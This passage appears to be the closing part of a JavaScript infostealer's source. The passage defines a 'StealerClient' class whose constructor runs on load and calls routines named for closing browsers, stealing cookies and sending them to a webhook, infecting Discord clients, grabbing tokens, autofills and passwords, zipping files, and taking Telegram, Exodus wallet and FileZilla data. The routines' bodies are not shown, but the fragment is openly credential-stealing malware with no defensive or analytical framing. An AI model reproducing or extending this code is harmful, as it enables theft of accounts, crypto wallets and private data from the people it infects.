  });
}


//


function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

class StealerClient {
	constructor() {
		closeBrowsers();
		StopCords();
		getEncrypted();
		getCookiesAndSendWebhook();
		getExtension();
		InfectDiscords();
	     stealTokens();
		stealltokens();
		getAutofills();
	getPasswords();
		getZippp();
		SubmitTelegram();
		SubmitExodus();
submitfilezilla();
	}
}

new StealerClient()
